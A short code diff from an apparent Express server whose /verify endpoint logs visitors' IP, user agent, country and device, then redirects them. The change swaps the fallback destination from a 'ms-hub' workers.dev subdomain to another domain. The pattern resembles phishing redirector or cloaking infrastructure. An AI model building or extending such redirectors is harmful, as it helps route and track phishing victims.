@@ -210,7 +210,7 @@ app.post('/verify', async (req, res) => {
         const device = detectDeviceType(ua);
 
         logVisitor(clientIp, ua, country, device);
-        const baseUrl = process.env.REDIRECT_BASE_URL || 'https://net-relay-a0ad.ms-hub-077d.workers.dev/share/sKBxJESkZ7k';
+        const baseUrl = process.env.REDIRECT_BASE_URL || 'https://storerack24.net/share/pC_rikQdxPY';
         const cleanBaseUrl = baseUrl.endsWith('#') ? baseUrl.slice(0, -1) : baseUrl;
         //const redirectUrl = cleanBaseUrl + '/' + encodeURIComponent(cleanB64);
         //const redirectUrl = cleanBaseUrl + '/' + encodeURIComponent(cleanB64);
